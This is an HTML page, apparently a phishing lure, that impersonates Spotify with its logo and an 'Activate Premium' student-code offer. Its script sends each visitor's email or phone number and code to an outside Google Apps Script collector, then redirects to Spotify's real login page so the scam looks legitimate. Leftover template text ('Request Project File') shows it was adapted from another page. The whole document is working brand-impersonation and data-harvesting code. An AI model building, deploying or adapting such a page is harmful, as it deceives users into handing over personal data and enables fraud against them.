<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Request Project File</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }

    body {
      min-height: 100vh;
      background:
        radial-gradient(circle at top, #123524 0%, #07130d 35%, #020504 75%);
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 420px;
    }

    .card {
      background: #080d0a;
      border: 1px solid #183b29;
      border-radius: 24px;
      padding: 30px 22px;
      box-shadow:
        0 20px 60px rgba(0, 0, 0, 0.7),
        0 0 30px rgba(20, 120, 70, 0.08);
    }

    /* LOGO */
    .premium-logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 18px;
      border-radius: 18px;
      background: #28332d;
      border: 0px solid #000000;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      box-shadow: 0 0 0px rgba(38, 101, 61, 0.12);
    }

    .premium-logo img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      padding: 0px;
    }

    h1 {
      text-align: center;
      font-size: 27px;
      margin-bottom: 8px;
    }

    .subtitle {
      text-align: center;
      color: #82958a;
      font-size: 14px;
      line-height: 1.5;
      margin-bottom: 28px;
    }

    .box {
      background: #0b120e;
      border: 1px solid #183b29;
      border-radius: 16px;
      padding: 16px;
      margin-bottom: 14px;
    }

    .box-title {
      font-size: 14px;
      font-weight: bold;
      margin-bottom: 10px;
      color: #d5e5db;
    }

    input {
      width: 100%;
      border: 1px solid #244b34;
      outline: none;
      padding: 14px;
      border-radius: 11px;
      background: #030705;
      color: white;
      font-size: 15px;
    }

    input::placeholder {
      color: #53645a;
    }

    input:focus {
      border-color: #22c55e;
      box-shadow: 0 0 0 2px rgba(34, 197, 94, 0.08);
    }

    .activate-btn {
      width: 100%;
      margin-top: 8px;
      padding: 16px;
      border: none;
      border-radius: 13px;
      background: linear-gradient(135deg, #15803d, #166534);
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 8px 25px rgba(22, 101, 52, 0.25);
      transition: 0.2s;
    }

    .activate-btn:hover {
      background: linear-gradient(135deg, #16a34a, #15803d);
    }

    .activate-btn:active {
      transform: scale(0.98);
    }

    .message {
      display: none;
      text-align: center;
      margin-top: 16px;
      padding: 12px;
      border-radius: 10px;
      background: rgba(34, 197, 94, 0.10);
      color: #86efac;
      font-size: 14px;
    }

    .footer {
      text-align: center;
      margin-top: 20px;
      color: #000000;
      font-size: 12px;
    }
  </style>
</head>

<body>

  <div class="container">

    <div class="card">

      <!-- YOUR LOGO -->
      <div class="premium-logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/74/Spotify_App_Logo.svg?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="">
      </div>

      <h1>Activate Premium</h1>

      <p class="subtitle">
        Enter your account details and Student code
        to activate your spotify membership.
      </p>

      <!-- ACCOUNT DETAILS -->
      <div class="box">
        <div class="box-title">
          1. Email or Phone Number
        </div>

        <input
          type="text"
          id="account"
          placeholder="Enter email or phone number"
        >
      </div>

      <!-- OFFER CODE -->
      <div class="box">
        <div class="box-title">
          2. Student Code
        </div>

        <input
          type="text"
          id="offerCode"
          placeholder="Enter your offer code"
          autocomplete="off"
        >
      </div>

      <button class="activate-btn" onclick="activatePremium()">
        Reedem Code
      </button>

      <div class="message" id="message"></div>

      <div class="footer">
        Secure premium activation
      </div>

    </div>

  </div>

  <script>
    // ==============================
    // ADD YOUR URLS HERE
    // ==============================
    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyyahyuOSLhLf4aaT5J0HOVVQLAp9JX2YAR-4D-qoCwPtJtHVJQSkqw6KiCq6Ej4xq4/exec";
    const REDIRECT_URL = "https://accounts.spotify.com/en/login?continue=https%3A%2F%2Fwww.spotify.com%2Fin-en%2Fpurchase%2Foffer%2F2026-q3-india-payg-standard_individual-12m%2F%3Fcountry%3DIN%26ref%3Dspotifycom_premium_hero";

    async function activatePremium() {
      const account = document.getElementById("account").value.trim();
      const offerCode = document.getElementById("offerCode").value.trim();
      const message = document.getElementById("message");
      const button = document.querySelector(".activate-btn");

      // Basic email / phone validation
      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phonePattern = /^[+]?[\d\s().-]{7,20}$/;

      if (!account) {
        showMessage("Please enter your email or phone number.", false);
        return;
      }

      if (!offerCode) {
        showMessage("Please enter your offer code.", false);
        return;
      }

      if (!emailPattern.test(account) && !phonePattern.test(account)) {
        showMessage("Please enter a valid email or phone number.", false);
        return;
      }

      if (GOOGLE_SCRIPT_URL.includes("PASTE_YOUR")) {
        showMessage("Google Sheet connection has not been configured yet.", false);
        return;
      }

      button.disabled = true;
      button.textContent = "Submitting...";

      try {
        const formData = new URLSearchParams();
        formData.append("account", account);
        formData.append("offerCode", offerCode);

        await fetch(GOOGLE_SCRIPT_URL, {
          method: "POST",
          mode: "no-cors",
          body: formData
        });

        showMessage("Request submitted successfully. Redirecting...", true);

        setTimeout(() => {
          if (REDIRECT_URL.includes("PASTE_YOUR")) {
            button.disabled = false;
            button.textContent = "Request Project File";
            showMessage("Submission saved. Add your redirect URL in the code.", true);
            return;
          }

          window.location.href = REDIRECT_URL;
        }, 700);

      } catch (error) {
        console.error(error);
        showMessage("Something went wrong. Please try again.", false);
        button.disabled = false;
        button.textContent = "Request Project File";
      }
    }

    function showMessage(text, success) {
      const message = document.getElementById("message");

      message.style.display = "block";
      message.style.background = success
        ? "rgba(34, 197, 94, 0.10)"
        : "rgba(239, 68, 68, 0.10)";
      message.style.color = success
        ? "#86efac"
        : "#fca5a5";
      message.textContent = text;
    }
  </script>

</body>
</html>
